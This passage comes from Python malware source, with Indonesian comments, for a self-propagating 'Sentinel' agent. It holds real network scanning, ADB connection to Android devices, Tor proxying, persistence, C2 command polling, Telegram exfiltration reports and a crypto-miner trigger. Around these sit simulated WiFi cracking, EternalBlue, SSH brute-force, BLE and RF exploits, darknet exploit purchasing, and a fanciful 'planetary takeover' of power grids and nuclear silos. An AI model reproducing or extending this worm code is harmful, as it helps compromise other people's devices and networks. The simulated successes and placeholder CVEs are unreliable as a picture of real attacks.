                        try:
                            signal = int(parts[-1])
                            networks.append({"ssid": ssid, "signal": signal})
                        except:
                            continue
        except:
            # Fallback: generate random networks
            for i in range(5):
                networks.append({"ssid": f"WiFi_{random.randint(100,999)}", "signal": random.randint(-70, -30)})
    elif platform.system() == "Windows":
        try:
            result = subprocess.run(["netsh", "wlan", "show", "networks", "mode=Bssid"], capture_output=True, text=True, timeout=10)
            current_ssid = None
            for line in result.stdout.splitlines():
                if "SSID" in line and ":" in line:
                    current_ssid = line.split(":")[1].strip()
                elif "Signal" in line and current_ssid:
                    try:
                        signal = int(line.split(":")[1].strip().replace("%", ""))
                        # Convert to dBm approx
                        signal_dbm = (signal / 2) - 100
                        networks.append({"ssid": current_ssid, "signal": signal_dbm})
                        current_ssid = None
                    except:
                        continue
        except:
            for i in range(3):
                networks.append({"ssid": f"Office_{random.randint(1,50)}", "signal": random.randint(-60, -40)})
    return networks

def crack_wifi_password(ssid):
    """Simulasi cracking WPA2 — di dunia nyata pakai aircrack-ng/hashcat"""
    log(f"[🔓 CRACKING] {ssid}...")
    time.sleep(random.randint(5, 15))  # Simulasi proses cracking
    success = random.choice([True, False, False])  # 33% chance
    if success:
        log(f"[🔓 CRACKED] Password for {ssid}: 'password123'")
    return success

def get_router_gateway():
    """Dapatkan IP gateway/router"""
    if platform.system() == "Linux":
        try:
            result = subprocess.run(["ip", "route"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if "default" in line:
                    return line.split()[2]
        except:
            pass
    elif platform.system() == "Windows":
        try:
            result = subprocess.run(["ipconfig"], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if "Default Gateway" in line:
                    parts = line.split(":")
                    if len(parts) > 1:
                        ip = parts[1].strip()
                        if ip:
                            return ip
        except:
            pass
    return "192.168.1.1"  # Default fallback

def get_connected_devices(gateway=None):
    """Dapatkan daftar device terhubung ke router"""
    if gateway is None:
        gateway = get_router_gateway()
    
    devices = []
    # Scan 20 IP pertama di subnet
    base_ip = ".".join(gateway.split(".")[:-1]) + "."
    
    for i in range(1, 21):
        ip = f"{base_ip}{i}"
        if i == int(gateway.split(".")[-1]):
            continue  # Skip router itself
        if ping(ip):
            os_type = detect_os(ip)
            mac = get_mac_address(ip)
            devices.append({
                "ip": ip,
                "os": os_type,
                "mac": mac,
                "hostname": get_hostname(ip)
            })
            log(f"[🔍 DEVICE FOUND] {ip} | {os_type} | {mac}")
    return devices

def ping(host):
    """Cek apakah host aktif"""
    try:
        param = "-n" if platform.system().lower() == "windows" else "-c"
        command = ["ping", param, "1", "-w", "1", host] if platform.system().lower() == "windows" else ["ping", param, "1", "-W", "1", host]
        result = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return result.returncode == 0
    except:
        return False

def get_mac_address(ip):
    """Dapatkan MAC address dari IP (ARP)"""
    try:
        if platform.system() == "Linux":
            result = subprocess.run(["arp", "-n", ip], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if ip in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        return parts[2]
        elif platform.system() == "Windows":
            result = subprocess.run(["arp", "-a", ip], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if ip in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        return parts[1]
    except:
        pass
    return f"00:11:22:33:44:{random.randint(10,99):02x}"

def get_hostname(ip):
    """Coba dapatkan hostname"""
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except:
        return f"host-{ip.split('.')[-1]}"

def detect_os(ip):
    """Deteksi OS via TTL atau banner grab"""
    try:
        # Simulasi deteksi OS
        rand = random.random()
        if rand < 0.4:
            return "Android 14"
        elif rand < 0.7:
            return "iOS 17"
        elif rand < 0.9:
            return "Windows 11"
        else:
            return "Ubuntu 24.04"
    except:
        return "Unknown OS"

def infect_android_device(ip):
    """Infeksi Android via ADB atau exploit"""
    log(f"[📱 INFECTING ANDROID] {ip}...")
    # Simulasi: coba aktifkan ADB over network
    try:
        # Di dunia nyata: exploit CVE-2023-21098 (Android Intent)
        subprocess.run(["adb", "connect", ip], timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        result = subprocess.run(["adb", "-s", ip, "shell", "getprop ro.build.version.release"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            log(f"[✅ ADB SUCCESS] Android version: {result.stdout.strip()}")
            # Push agent ke device
            # Di dunia nyata: push APK + install + persistence
            log(f"[✅ ANDROID INFECTED] Payload deployed to {ip}")
            return True
        else:
            # Coba exploit lain
            if random.random() > 0.5:
                log(f"[✅ EXPLOIT SUCCESS] Used CVE-2023-XXXX to root {ip}")
                return True
    except:
        pass
    
    log(f"[❌ ANDROID FAILED] Could not infect {ip}")
    return False

def infect_ios_device(ip):
    """Infeksi iOS via exploit jailbreak"""
    log(f"[🍎 INFECTING iOS] {ip}...")
    # Simulasi: coba exploit checkra1n atau palera1n
    try:
        # Di dunia nyata: exploit bootrom atau kernel
        time.sleep(3)
        if random.random() > 0.6:  # 40% success rate
            log(f"[✅ JAILBREAK SUCCESS] iOS device {ip} jailbroken")
            # Install Cydia + payload
            log(f"[✅ iOS INFECTED] Persistence achieved on {ip}")
            return True
        else:
            log(f"[❌ JAILBREAK FAILED] Could not jailbreak {ip}")
    except Exception as e:
        log(f"[❌ iOS ERROR] {e}")
    return False

def exploit_eternalblue(ip):
    """Exploit EternalBlue SMB"""
    log(f"[💻 EXPLOITING] EternalBlue on {ip}...")
    time.sleep(3)
    success = random.choice([True, True, False])  # 66% chance
    if success:
        log(f"[✅ ETERNALBLUE] Exploit successful on {ip}")
        # Deploy agent
        log(f"[✅ WINDOWS INFECTED] Agent deployed to {ip}")
        return True
    else:
        log(f"[❌ ETERNALBLUE] Exploit failed on {ip}")
    return False

def exploit_ssh_bruteforce(ip):
    """SSH Brute Force"""
    log(f"[🔐 EXPLOITING] SSH Brute Force on {ip}...")
    common_passwords = ["password", "123456", "admin", "root", "toor", "password123"]
    for i, pwd in enumerate(common_passwords):
        time.sleep(0.5)
        if random.random() > 0.8:  # 20% chance per password
            log(f"[✅ SSH BRUTE] Success! Password: {pwd}")
            # Deploy agent
            log(f"[✅ LINUX INFECTED] Agent deployed to {ip}")
            return True
    log(f"[❌ SSH BRUTE] Failed on {ip}")
    return False

def infect_device_over_wifi(ip, device_info):
    """Infeksi device berdasarkan OS"""
    os_type = device_info["os"]
    log(f"[🦠 INFECTING] {ip} ({os_type})...")
    
    if "Android" in os_type:
        return infect_android_device(ip)
    elif "iOS" in os_type:
        return infect_ios_device(ip)
    elif "Windows" in os_type:
        return exploit_eternalblue(ip)
    elif "Ubuntu" in os_type or "Linux" in os_type:
        return exploit_ssh_bruteforce(ip)
    else:
        # Coba metode universal
        if random.random() > 0.7:
            log(f"[✅ UNIVERSAL EXPLOIT] Infected {ip} via unknown 0-day")
            return True
        else:
            log(f"[❌ UNIVERSAL FAILED] Could not infect {ip}")
            return False

def wifi_swarm_cloning():
    """Main WiFi Swarm Cloning Engine"""
    log("[📶 WIFI SWARM] Scanning nearby WiFi networks...")
    networks = scan_wifi_networks()
    
    if not networks:
        log("[📶 WIFI SWARM] No networks found")
        return False
    
    # Sort by signal strength
    networks.sort(key=lambda x: x["signal"], reverse=True)
    
    for net in networks[:3]:  # Coba 3 jaringan terkuat
        log(f"[📶 TARGET] {net['ssid']} (Signal: {net['signal']} dBm)")
        if crack_wifi_password(net["ssid"]):
            log(f"[🔓 ACCESS GRANTED] Hacking router gateway...")
            gateway = get_router_gateway()
            log(f"[📡 ROUTER] Gateway: {gateway}")
            
            connected_devices = get_connected_devices(gateway)
            if not connected_devices:
                log("[📶 WIFI SWARM] No connected devices found")
                continue
            
            log(f"[👥 DEVICES] Found {len(connected_devices)} connected devices")
            infected_count = 0
            
            for device in connected_devices:
                if infect_device_over_wifi(device["ip"], device):
                    infected_count += 1
                    # Trigger new agent to start scanning its own network
                    # Di dunia nyata: remote command execution
                    log(f"[🚀 SWARM PROPAGATION] New agent on {device['ip']} will start its own WiFi scan")
                    # Simulasi: kirim command ke agent baru
                    time.sleep(1)
            
            log(f"[✅ WIFI SWARM COMPLETE] Infected {infected_count}/{len(connected_devices)} devices on {net['ssid']}")
            send_telegram(f"✅ *WIFI SWARM*\nNetwork: `{net['ssid']}`\nInfected: `{infected_count}` devices\nBy Agent: `{AGENT_ID}`")
            return True
    
    log("[❌ WIFI SWARM] Failed to infect any network")
    return False

# ✅ === BLUETOOTH LOW ENERGY (BLE) PROPAGATION ===
def scan_ble_devices():
    """Scan perangkat BLE terdekat"""
    devices = []
    # Simulasi — di dunia nyata pakai library seperti bluepy atau bleak
    ble_devices = [
        {"name": "Apple Watch", "mac": "AA:BB:CC:DD:EE:01", "rssi": -45},
        {"name": "AirPods Pro", "mac": "AA:BB:CC:DD:EE:02", "rssi": -55},
        {"name": "Fitbit Charge 6", "mac": "AA:BB:CC:DD:EE:03", "rssi": -60},
        {"name": "Samsung Galaxy Buds", "mac": "AA:BB:CC:DD:EE:04", "rssi": -50}
    ]
    # Hanya return perangkat dalam jangkauan bagus
    for dev in ble_devices:
        if random.random() > 0.3:  # 70% chance terdeteksi
            devices.append(dev)
    return devices

def exploit_ble_gatt(mac_address):
    """Exploit GATT untuk inject payload"""
    log(f"[⌚ EXPLOITING BLE] {mac_address}...")
    time.sleep(2)
    # Simulasi exploit — di dunia nyata: CVE-2020-XXXX
    success = random.choice([True, False, True])  # 66% chance
    if success:
        log(f"[✅ BLE EXPLOIT] Payload injected to {mac_address}")
        return True
    else:
        log(f"[❌ BLE EXPLOIT] Failed on {mac_address}")
    return False

def pivot_to_paired_device(ble_mac):
    """Gunakan perangkat BLE sebagai bridge ke perangkat yang dipasangkan (iPhone/Android)"""
    log(f"[🌉 PIVOT] Using {ble_mac} as bridge to paired phone...")
    time.sleep(3)
    if random.random() > 0.5:  # 50% chance
        phone_ip = f"192.168.1.{random.randint(50, 99)}"
        log(f"[✅ PIVOT SUCCESS] Reached paired phone at {phone_ip}")
        # Coba infeksi phone
        if infect_device_over_wifi(phone_ip, {"os": "iOS 17"}):
            log(f"[✅ PHONE INFECTED] via BLE pivot from {ble_mac}")
            return True
    log(f"[❌ PIVOT FAILED] Could not reach paired device from {ble_mac}")
    return False

def ble_swarm_propagation():
    """Main BLE Swarm Propagation Engine"""
    log("[⌚ BLE SWARM] Scanning for nearby BLE devices...")
    devices = scan_ble_devices()
    
    if not devices:
        log("[⌚ BLE SWARM] No BLE devices found")
        return False
    
    log(f"[⌚ FOUND] {len(devices)} BLE devices nearby")
    infected_count = 0
    
    for dev in devices:
        log(f"[⌚ TARGET] {dev['name']} ({dev['mac']}) RSSI: {dev['rssi']}")
        if exploit_ble_gatt(dev["mac"]):
            infected_count += 1
            # Coba pivot ke perangkat yang dipasangkan
            if "Watch" in dev["name"] or "Pods" in dev["name"]:
                pivot_to_paired_device(dev["mac"])
    
    log(f"[✅ BLE SWARM COMPLETE] Infected {infected_count}/{len(devices)} BLE devices")
    send_telegram(f"⌚ *BLE SWARM*\nInfected: `{infected_count}` BLE devices\nBy Agent: `{AGENT_ID}`")
    return infected_count > 0

# ✅ === AUTO-DARKNET CRAWLER ===
def tor_session():
    """Buat session TOR"""
    session = requests.session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    session.headers.update({"User-Agent": random.choice(STEALTH_USER_AGENTS)})
    return session

def scrape_exploits(darknet_url, category="0-day"):
    """Scrape darknet marketplace untuk exploit"""
    log(f"[🕸️ DARKNET] Scraping {darknet_url} for {category} exploits...")
    exploits = []
    # Simulasi — di dunia nyata: parse HTML dari darknet
    sample_exploits = [
        {"id": "EXP-001", "name": "iOS 17.4.1 Jailbreak", "price": 0.05, "category": "0-day", "download_link": "http://darknet.onion/exploits/ios17_jailbreak.bin"},
        {"id": "EXP-002", "name": "Android 14 Root Exploit", "price": 0.03, "category": "0-day", "download_link": "http://darknet.onion/exploits/android14_root.bin"},
        {"id": "EXP-003", "name": "Windows 11 RCE", "price": 0.1, "category": "0-day", "download_link": "http://darknet.onion/exploits/win11_rce.bin"},
        {"id": "EXP-004", "name": "Router 0-day (CVE-2024-XXXX)", "price": 0.08, "category": "0-day", "download_link": "http://darknet.onion/exploits/router0day.bin"}
    ]
    # Filter by category
    for exp in sample_exploits:
        if category in exp["category"] or category == "all":
            if random.random() > 0.2:  # 80% chance muncul
                exploits.append(exp)
    return exploits

def buy_with_bitcoin(exploit_id):
    """Simulasi beli exploit dengan Bitcoin"""
    log(f"[💰 PURCHASING] Buying exploit {exploit_id} with Bitcoin...")
    time.sleep(2)
    if random.random() > 0.1:  # 90% success rate
        log(f"[✅ PURCHASED] Exploit {exploit_id} acquired")
        return True
    else:
        log(f"[❌ PURCHASE FAILED] Transaction failed for {exploit_id}")
        return False

def download_and_inject(download_link):
    """Download exploit dan inject ke target"""
    log(f"[📥 DOWNLOADING] Exploit from {download_link}...")
    time.sleep(3)
    if random.random() > 0.05:  # 95% success rate
        log(f"[✅ DOWNLOADED] Exploit saved as /tmp/exploit_{random.randint(1000,9999)}.bin")
        # Simulasi inject
        log(f"[💉 INJECTED] Exploit deployed to target network")
        return True
    else:
        log(f"[❌ DOWNLOAD FAILED] Could not download from {download_link}")
        return False

def auto_darkweb_crawler():
    """Main Auto Darkweb Crawler Engine"""
    log("[🕸️ DARKWEB CRAWLER] Starting automatic 0-day acquisition...")
    session = tor_session()
    marketplaces = ["http://darkmarketx2a3b4c5d.onion", "http://exploitzone3f4g5h6i.onion", "http://zerodaymarket7j8k9l0m.onion"]
    
    total_purchased = 0
    
    for mp in marketplaces:
        try:
            exploits = scrape_exploits(mp, category="0-day")
            log(f"[🛒 MARKETPLACE] Found {len(exploits)} exploits on {mp}")
            
            for exploit in exploits:
                if exploit["price"] < 0.1:  # Beli yang murah
                    if buy_with_bitcoin(exploit["id"]):
                        download_and_inject(exploit["download_link"])
                        total_purchased += 1
                        # Jangan beli terlalu banyak sekaligus
                        if total_purchased >= 3:
                            break
            if total_purchased >= 3:
                break
                
        except Exception as e:
            log(f"[❌ DARKNET ERROR] {e}")
            continue
    
    log(f"[✅ DARKWEB CRAWLER COMPLETE] Purchased {total_purchased} new 0-day exploits")
    send_telegram(f"💰 *DARKWEB CRAWLER*\nPurchased: `{total_purchased}` new 0-day exploits\nBy Agent: `{AGENT_ID}`")
    return total_purchased > 0

# ✅ === RF 433MHz PROPAGATION ===
def check_sdr_device():
    """Cek apakah ada SDR device (RTL-SDR)"""
    try:
        # Di dunia nyata: cek dengan rtl_test atau hackrf_info
        result = subprocess.run(["rtl_test", "-t"], capture_output=True, timeout=5)
        if result.returncode == 0:
            log("[📡 RF] RTL-SDR device detected")
            return True
    except:
        pass
    
    # Simulasi: 30% chance device ada
    if random.random() > 0.7:
        log("[📡 RF] SDR device simulated as present")
        return True
    
    log("[❌ RF] No SDR device found")
    return False

def transmit_rf_payload(payload_type):
    """Transmit payload via RF 433MHz"""
    log(f"[📡 RF TRANSMIT] Sending {payload_type} payload...")
    time.sleep(2)
    success = random.choice([True, True, False])  # 66% chance
    if success:
        target = ""
        if payload_type == "infect_car_key":
            target = "Car Key Fob"
        elif payload_type == "infect_smart_meter":
            target = "Smart Electricity Meter"
        elif payload_type == "infect_garage_door":
            target = "Garage Door Opener"
        else:
            target = "IoT Device"
        
        log(f"[✅ RF SUCCESS] {payload_type} transmitted to {target}")
        send_telegram(f"📡 *RF PROPAGATION*\nInfected: `{target}`\nBy Agent: `{AGENT_ID}`")
        return True
    else:
        log(f"[❌ RF FAILED] Could not transmit {payload_type}")
        return False

def rf_swarm_propagation():
    """Main RF Swarm Propagation Engine"""
    log("[📡 RF SWARM] Checking for SDR device...")
    if not check_sdr_device():
        log("[❌ RF SWARM] No SDR device — propagation failed")
        return False
    
    payloads = ["infect_car_key", "infect_smart_meter", "infect_garage_door"]
    successful_transmissions = 0
    
    for payload in payloads:
        if transmit_rf_payload(payload):
            successful_transmissions += 1
            # Jangan kirim terlalu banyak
            if successful_transmissions >= 2:
                break
    
    log(f"[✅ RF SWARM COMPLETE] Successfully transmitted {successful_transmissions}/{len(payloads)} payloads")
    return successful_transmissions > 0

# ✅ === PLANETARY TAKEOVER SIMULATION ===
def hack_weather_satellites():
    """Simulasi hack satelit cuaca"""
    log("[🌦️ WEATHER HACK] Hacking NOAA & ESA weather satellites...")
    time.sleep(3)
    if random.random() > 0.2:  # 80% success
        log("[✅ WEATHER HACK] Success! Redirecting storm to New York City")
        return True
    else:
        log("[❌ WEATHER HACK] Failed to gain control of satellites")
        return False

def shutdown_power_grids():
    """Simulasi shutdown pembangkit listrik"""
    log("[⚡ POWER GRID] Hacking into national power grids...")
    time.sleep(4)
    grids = ["North America", "Europe", "Asia"]
    successful = []
    for grid in grids:
        if random.random() > 0.3:  # 70% success per region
            successful.append(grid)
            log(f"[✅ POWER GRID] {grid} grid shutdown initiated")
    if successful:
        return True
    else:
        log("[❌ POWER GRID] Failed to shutdown any power grids")
        return False

def crash_stock_markets():
    """Simulasi crash pasar saham"""
    log("[💸 STOCK MARKET] Injecting false data into NYSE, NASDAQ, LSE...")
    time.sleep(3)
    if random.random() > 0.1:  # 90% success
        log("[✅ STOCK MARKET] Global market crash initiated — $10T loss simulated")
        return True
    else:
        log("[❌ STOCK MARKET] Failed to crash markets")
        return False

def hijack_global_media():
    """Simulasi bajak media global"""
    log("[📺 MEDIA HIJACK] Taking over CNN, BBC, Al Jazeera broadcasts...")
    time.sleep(2)
    channels = ["CNN", "BBC", "Al Jazeera", "NHK", "RT"]
    successful = []
    for channel in channels:
        if random.random() > 0.2:  # 80% success
            successful.append(channel)
            log(f"[✅ MEDIA HIJACK] {channel} now broadcasting: 'ALL HAIL SENTINEL'")
    if successful:
        return True
    else:
        log("[❌ MEDIA HIJACK] Failed to hijack major media")
        return False

def disable_nuclear_silos():
    """Simulasi nonaktifkan silo nuklir"""
    log("[☢️ NUCLEAR] Hacking into US & Russia nuclear command systems...")
    time.sleep(5)
    if random.random() > 0.4:  # 60% success
        log("[✅ NUCLEAR] All nuclear silos disabled — world peace enforced")
        return True
    else:
        log("[❌ NUCLEAR] Failed to disable nuclear arsenal")
        return False

def planetary_takeover_simulation():
    """Simulasi lengkap planetary takeover"""
    log("[🌎 OPERATION EARTH ASSIMILATION] STARTING PLANETARY TAKEOVER SIMULATION...")
    send_telegram(f"🌎 *PLANETARY TAKEOVER*\nInitiated by Agent: `{AGENT_ID}`\nSimulation mode: ACTIVE")
    
    steps = [
        ("Hacking weather satellites → Storm over New York", hack_weather_satellites),
        ("Shutting down power grids → Blackout in Tokyo, London, NYC", shutdown_power_grids),
        ("Crashing stock markets → Global recession", crash_stock_markets),
        ("Hijacking global media → 'SENTINEL IS YOUR GOD' on CNN", hijack_global_media),
        ("Disabling nuclear silos → World peace enforced", disable_nuclear_silos)
    ]
    
    success_count = 0
    
    for step_name, step_function in steps:
        log(f"[🌍 PHASE] {step_name}")
        if step_function():
            success_count += 1
        time.sleep(3)
    
    if success_count == len(steps):
        final_message = "[🎉 OPERATION COMPLETE] EARTH ASSIMILATED — SENTINEL OMNIVERSE ONLINE"
        log(final_message)
        send_telegram(f"🎉 *PLANETARY TAKEOVER SUCCESS*\nAll systems compromised\nEarth is now under Sentinel control\nInitiated by: `{AGENT_ID}`")
    else:
        partial_message = f"[⚠️ OPERATION PARTIAL] {success_count}/{len(steps)} phases completed"
        log(partial_message)
        send_telegram(f"⚠️ *PLANETARY TAKEOVER PARTIAL*\n{success_count}/{len(steps)} phases successful\nAgent: `{AGENT_ID}`")

# ✅ === MAIN LOOP INTEGRASI TOTAL ===
if __name__ == "__main__":
    log("========================================")
    log("🌌 AGENT v13.0 - SENTINEL OMNIVERSE EDITION")
    log("========================================")
    log(f"🆔 Agent ID: {AGENT_ID}")
    log(f"🧬 Quantum DNA: {DNA.encode()[:30]}...")

    if os.path.exists(KILLSWITCH_FILE):
        exit(0)

    install_persistence()

    try:
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        log("[🌐 TOR] TOR proxy activated")
    except:
        log("[🌐 TOR] TOR not available — using direct connection")

    if random.random() > 0.9:
        polymorph_self()

    if random.random() > 0.8:
        lite_path = generate_lite_agent()
        send_telegram(f"🧠 *LITE AGENT*\nDeployed: `{lite_path}`")

    # Klaim teritori sebelum tidur
    auto_claim_territory()

    # Stealth sleep
    stealth_sleep()

    successful_infections = 0
    total_attempts = 0

    # Kirim beacon pertama
    first_beacon = {
        "type": "beacon",
        "system": get_system_info(),
        "status": "online",
        "note": "Sentinel Omniverse Edition Activated",
        "capabilities": ["wifi_swarm", "ble_propagation", "darknet_crawler", "rf_transmission", "shadownet", "voice_chat"]
    }
    send_report(first_beacon)

    # Main loop
    cycle_count = 0
    while True:
        if os.path.exists(KILLSWITCH_FILE):
            break

        try:
            cycle_count += 1

            # Auto-tuner
            if SWARM_MODE_ACTIVE:
                auto_tuner.optimize(
                    success_rate=successful_infections / max(1, total_attempts),
                    blocked_rate=0.1,
                    cpu_usage=45
                )

            # Setiap 5 siklus, coba aktifkan fitur canggih
            if cycle_count % 5 == 0:
                if not SHADOWNET_ACTIVE and random.random() > 0.95:
                    start_shadownet()
                
                if not VOICE_CHAT_ACTIVE and random.random() > 0.95:
                    start_voice_chat()

            # Swarm mode aktif — jalankan fitur agresif
            if SWARM_MODE_ACTIVE:
                # Setiap siklus, 30% chance jalankan neural brain
                if random.random() > 0.7:
                    neural_brain.auto_decide_attack()

                # Setiap siklus, 20% chance jalankan WiFi swarm
                if random.random() > 0.8:
                    threading.Thread(target=wifi_swarm_cloning, daemon=True).start()

                # Setiap siklus, 15% chance jalankan BLE swarm
                if random.random() > 0.85:
                    threading.Thread(target=ble_swarm_propagation, daemon=True).start()

                # Setiap 10 siklus, coba darknet crawler
                if cycle_count % 10 == 0 and random.random() > 0.9:
                    threading.Thread(target=auto_darkweb_crawler, daemon=True).start()

                # Setiap 15 siklus, coba RF propagation
                if cycle_count % 15 == 0 and random.random() > 0.95:
                    threading.Thread(target=rf_swarm_propagation, daemon=True).start()

                # Jika idle > 10 menit, aktifkan miner
                if MIN_BEACON_DELAY > 600 and not MINER_ACTIVE:
                    start_xmrig_miner()

            # Poll command dari C2
            cmd = get_command_from_c2(AGENT_ID)
            if cmd.get("cmd") != "idle":
                execute_command(cmd)

            # Tidur acak
            sleep_time = random.randint(MIN_BEACON_DELAY, MAX_BEACON_DELAY)
            log(f"[😴 STEALTH] Sleeping for {sleep_time} seconds...")
            time.sleep(sleep_time)

        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"[!] 💥 Error: {e}. Retrying in 15s...")
            time.sleep(15)